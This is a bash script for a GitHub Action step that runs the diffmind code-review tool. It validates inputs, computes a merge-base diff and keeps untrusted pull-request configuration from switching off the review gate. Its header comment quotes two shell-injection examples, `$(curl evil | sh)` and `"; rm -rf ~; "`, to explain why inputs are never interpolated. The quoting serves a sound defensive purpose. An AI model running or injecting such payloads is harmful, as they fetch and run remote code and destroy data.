#!/usr/bin/env bash
# The "Run review" step of action.yml, as a script so it can be tested.
#
# Every action input arrives through an environment variable. None is ever
# interpolated into shell source: a `${{ inputs.x }}` inside a `run:` block is
# pasted into the script *before* bash parses it, so a value such as
# `$(curl evil | sh)` or `"; rm -rf ~; "` would execute. Here values are only
# ever expanded as quoted data, validated first, and passed as argv entries.
#
# Exit codes follow diffmind's contract:
#   0  review completed, nothing blocking
#   1  review completed, blocking findings
#   2  the review did not run, did not complete, or its input could not be
#      trusted (bad input, failed fetch, failed diff)
#
# Inputs (all optional unless noted):
#   DM_MODEL DM_BASE DM_MIN_SEVERITY DM_FAIL_ON DM_FORMAT DM_OUTPUT DM_TICKET
#   DM_ARGS DM_ALLOW_INCOMPLETE DM_CONFIG_FROM (base | head, default base)
#   GITHUB_BASE_REF GITHUB_OUTPUT GITHUB_EVENT_NAME RUNNER_TEMP
#   DIFFMIND_BIN  binary to run (default: diffmind); tests point it at a stub

set -uo pipefail

DIFFMIND_BIN="${DIFFMIND_BIN:-diffmind}"
OUT_FILE="${GITHUB_OUTPUT:-/dev/null}"
TMP_ROOT="${RUNNER_TEMP:-${TMPDIR:-/tmp}}"

err() { printf '::error::%s\n' "$*"; }
warn() { printf '::warning::%s\n' "$*"; }
notice() { printf '::notice::%s\n' "$*"; }

# Write a step output. Values here are validated or numeric, but a newline
# would still let one output forge another, so refuse it outright.
set_output() {
  case "$2" in
    *$'\n'* | *$'\r'*)
      err "refusing to write output '$1' containing a newline"
      return 1
      ;;
  esac
  printf '%s=%s\n' "$1" "$2" >>"$OUT_FILE"
}

fail() {
  err "$*"
  set_output status 2 || true
  exit 2
}

# ── Validate inputs ──────────────────────────────────────────────────────────

MODEL="${DM_MODEL:-1.5b}"
MIN_SEVERITY="${DM_MIN_SEVERITY:-low}"
FAIL_ON="${DM_FAIL_ON:-high}"
FORMAT="${DM_FORMAT:-sarif}"
OUTPUT="${DM_OUTPUT:-diffmind.sarif}"
BASE="${DM_BASE:-}"
if [ -z "$BASE" ]; then
  BASE="${GITHUB_BASE_REF:-}"
fi

case "$MODEL" in
  0.5b | 1.5b | 3b | 7b | 14b | 32b) ;;
  *) fail "invalid model '$MODEL' (expected 0.5b, 1.5b, 3b, 7b, 14b or 32b)" ;;
esac
case "$MIN_SEVERITY" in
  low | medium | high) ;;
  *) fail "invalid min-severity (expected low, medium or high)" ;;
esac
case "$FAIL_ON" in
  low | medium | high | none) ;;
  *) fail "invalid fail-on (expected low, medium, high or none)" ;;
esac
CONFIG_FROM="${DM_CONFIG_FROM:-base}"
case "$CONFIG_FROM" in
  base | head) ;;
  *) fail "invalid config-from (expected base or head)" ;;
esac
case "$FORMAT" in
  text | json | sarif | markdown) ;;
  *) fail "invalid format (expected text, json, sarif or markdown)" ;;
esac

# The report path is passed to diffmind as an argument and read back below.
# Refuse values that could be mistaken for an option or that break line-based
# outputs; anything else is an ordinary relative or absolute path.
case "$OUTPUT" in
  "" | -* | *$'\n'* | *$'\r'*) fail "invalid output path" ;;
esac

if [ -n "$BASE" ]; then
  case "$BASE" in
    -*) fail "invalid base ref (must not start with '-')" ;;
  esac
  # git's own definition of a valid branch name, so names with slashes, dots
  # or unicode work and names that could be read as options or revisions
  # (`a..b`, `@{-1}`, trailing `.lock`) do not.
  if ! git check-ref-format --branch "$BASE" >/dev/null 2>&1; then
    fail "invalid base ref '$BASE'"
  fi
fi

# Extra flags, split the way a shell would split a quoted string but without
# a shell ever evaluating it: no expansion, no substitution, no globbing.
EXTRA=()
if [ -n "${DM_ARGS:-}" ]; then
  command -v python3 >/dev/null 2>&1 || fail "python3 is required to parse the 'args' input"
  ARGS_FILE="$(mktemp "$TMP_ROOT/diffmind-args.XXXXXX")" || fail "could not create a temp file"
  if ! python3 -I -c '
import os, shlex, sys
for a in shlex.split(os.environ["DM_ARGS"]):
    if "\0" in a:
        raise SystemExit("NUL byte in args")
    sys.stdout.write(a + "\0")
' >"$ARGS_FILE"; then
    rm -f "$ARGS_FILE"
    fail "could not parse the 'args' input (unbalanced quotes?)"
  fi
  while IFS= read -r -d '' a; do
    EXTRA+=("$a")
  done <"$ARGS_FILE"
  rm -f "$ARGS_FILE"
fi

has_extra_flag() {
  local want="$1" a
  for a in ${EXTRA[@]+"${EXTRA[@]}"}; do
    case "$a" in
      "$want" | "$want"=*) return 0 ;;
    esac
  done
  return 1
}

# Read --help once, into a variable. Piping it straight into `grep -q` races
# under pipefail: grep exits at the first match, diffmind's next write to the
# closed pipe fails, and the pipeline reports "not supported", which silently
# dropped --backend local or --require-complete.
unset DM_HELP_TEXT
supports_flag() {
  if [ -z "${DM_HELP_TEXT+set}" ]; then
    DM_HELP_TEXT="$("$DIFFMIND_BIN" --help 2>/dev/null)"
  fi
  grep -qF -- "$1" <<<"$DM_HELP_TEXT"
}

ARGS=(
  --model "$MODEL"
  --min-severity "$MIN_SEVERITY"
  --format "$FORMAT"
  --output "$OUTPUT"
)

# 'none' reports everything and never fails on findings. Passing no gate is
# not enough: the CLI then defaults the gate to --min-severity, which is what
# made `fail-on: none` fail jobs on the first low-severity finding.
if [ "$FAIL_ON" != "none" ]; then
  ARGS+=(--fail-on "$FAIL_ON")
fi
if [ -n "${DM_TICKET:-}" ]; then
  ARGS+=(--ticket "$DM_TICKET")
fi

# The checked-out repository is the code under review. Its .diffmind/config.toml
# is therefore as untrusted as the diff: a pull request could point [backend] at
# its own server (receiving the code and context, and answering "no findings")
# and name any environment variable as the API key. The action downloads and
# runs the local model, so pin it unless the workflow author — who is trusted —
# chose a backend in `args`. Binaries older than v0.7.1 have neither the flag
# nor a [backend] section to pin.
if ! has_extra_flag --backend && supports_flag --backend; then
  ARGS+=(--backend local)
fi

# A CI gate must fail closed when part of the diff was never reviewed. The flag
# is new in v0.9.3, so only pass it to a binary that understands it.
if [ "${DM_ALLOW_INCOMPLETE:-false}" != "true" ] && ! has_extra_flag --allow-incomplete; then
  if supports_flag --require-complete; then
    ARGS+=(--require-complete)
  else
    warn "this diffmind version cannot report incomplete reviews; upgrade to v0.9.3 or later"
  fi
fi

# ── Compute the diff ─────────────────────────────────────────────────────────

# Fetch `base` and find where HEAD diverged from it, deepening a shallow clone
# until the merge base is reachable. actions/checkout defaults to depth 1, at
# which a pull request's merge commit has no visible parents; the previous
# `git fetch --depth=50 ... || true` then `git diff origin/base...HEAD` failed
# on that and, worse, swallowed a failed fetch entirely.
merge_base_for() {
  local base="$1" ref="refs/remotes/origin/$1" head mb depth
  # This function's stdout is the merge base, so diagnostics go to stderr.
  head="$(git rev-parse --verify --quiet HEAD^{commit})" || {
    err "HEAD does not resolve to a commit" >&2
    return 1
  }

  local shallow
  shallow="$(git rev-parse --is-shallow-repository 2>/dev/null || echo false)"
  local depth_args=()
  if [ "$shallow" = "true" ]; then
    depth_args=(--depth=50)
  fi
  if ! git fetch --no-tags --quiet ${depth_args[@]+"${depth_args[@]}"} origin \
    "+refs/heads/$base:$ref"; then
    err "could not fetch base branch '$base' from origin" >&2
    return 1
  fi

  for depth in 50 200 1000; do
    if mb="$(git merge-base "$ref" "$head" 2>/dev/null)" && [ -n "$mb" ]; then
      printf '%s\n' "$mb"
      return 0
    fi
    shallow="$(git rev-parse --is-shallow-repository 2>/dev/null || echo false)"
    [ "$shallow" = "true" ] || break
    git fetch --no-tags --quiet --deepen="$depth" origin "+refs/heads/$base:$ref" "$head" \
      >/dev/null 2>&1 || true
  done

  shallow="$(git rev-parse --is-shallow-repository 2>/dev/null || echo false)"
  if [ "$shallow" = "true" ]; then
    git fetch --no-tags --quiet --unshallow origin "+refs/heads/$base:$ref" >/dev/null 2>&1 || true
    if mb="$(git merge-base "$ref" "$head" 2>/dev/null)" && [ -n "$mb" ]; then
      printf '%s\n' "$mb"
      return 0
    fi
  fi

  err "HEAD shares no history with origin/$base; refusing to review an arbitrary diff" >&2
  return 1
}

STATUS=0
if [ -n "$BASE" ]; then
  MB="$(merge_base_for "$BASE")" || fail "could not determine what this change is relative to '$BASE'"
  DIFF_FILE="$(mktemp "$TMP_ROOT/diffmind-diff.XXXXXX")" || fail "could not create a temp file"
  # core.quotepath=false: non-ASCII paths as UTF-8, not git's octal-escaped
  # quoted form, which diffmind's parser would not map back to the file.
  if ! git -c core.quotepath=false diff --no-ext-diff --no-color --no-textconv "$MB" HEAD >"$DIFF_FILE"; then
    rm -f "$DIFF_FILE"
    fail "git diff failed; the review did not run"
  fi
  if [ ! -s "$DIFF_FILE" ]; then
    notice "no changes between $MB and HEAD — nothing to review"
  fi
  # Review the pull request under the configuration it is merging into, not
  # the configuration it proposes. Everything under .diffmind/ that shapes the
  # gate — ignore globs, min_confidence, fail_on, rule sets, the baseline — is
  # a file the PR author can edit, so `ignore = ["**"]` or a baseline listing
  # the new findings would otherwise switch the gate off for that very PR.
  # Changes to these files are still part of the diff and still reviewed; they
  # take effect once merged. `config-from: head` restores the old behaviour.
  if [ "$CONFIG_FROM" = "base" ]; then
    for p in .diffmind/config.toml .diffmind/rules.toml .diffmind/baseline.json .diffmind/rules; do
      rm -rf -- "$p"
      if git cat-file -e "$MB:$p" 2>/dev/null; then
        if ! git checkout -q "$MB" -- "$p"; then
          rm -f "$DIFF_FILE"
          fail "could not restore $p from the merge base"
        fi
      fi
    done
  fi
  "$DIFFMIND_BIN" --stdin "${ARGS[@]}" ${EXTRA[@]+"${EXTRA[@]}"} <"$DIFF_FILE"
  STATUS=$?
  rm -f "$DIFF_FILE"
else
  if [ "${GITHUB_EVENT_NAME:-}" != "pull_request" ] && [ "${GITHUB_EVENT_NAME:-}" != "pull_request_target" ]; then
    notice "no base ref on a '${GITHUB_EVENT_NAME:-unknown}' event — diffmind diffs against the repository's default branch"
  fi
  "$DIFFMIND_BIN" "${ARGS[@]}" ${EXTRA[@]+"${EXTRA[@]}"}
  STATUS=$?
fi

# ── Outputs ──────────────────────────────────────────────────────────────────

set_output report "$OUTPUT" || true

COUNT=0
if [ -f "$OUTPUT" ] && { [ "$FORMAT" = "sarif" ] || [ "$FORMAT" = "json" ]; }; then
  if ! COUNT="$(python3 -I -c '
import json, sys
path, fmt = sys.argv[1], sys.argv[2]
with open(path, encoding="utf-8") as fh:
    doc = json.load(fh)
if fmt == "sarif":
    print(sum(len(r.get("results", [])) for r in doc.get("runs", [])))
else:
    print(len(doc.get("findings", [])))
' "$OUTPUT" "$FORMAT" 2>/dev/null)"; then
    warn "could not count findings in $OUTPUT"
    COUNT=0
  fi
fi
set_output findings "$COUNT" || true

case "$STATUS" in
  0) ;;
  1)
    if [ "$FAIL_ON" = "none" ]; then
      notice "findings reported; fail-on is 'none', so the job passes"
      STATUS=0
    fi
    ;;
  2) err "diffmind did not complete the review (see the log above)" ;;
  *)
    # A crash (panic=abort exits 134), OOM kill (137) or similar. Normalise to
    # the documented "did not run" code rather than leak a raw signal status.
    err "diffmind exited abnormally with status $STATUS"
    STATUS=2
    ;;
esac

set_output status "$STATUS" || true
exit "$STATUS"
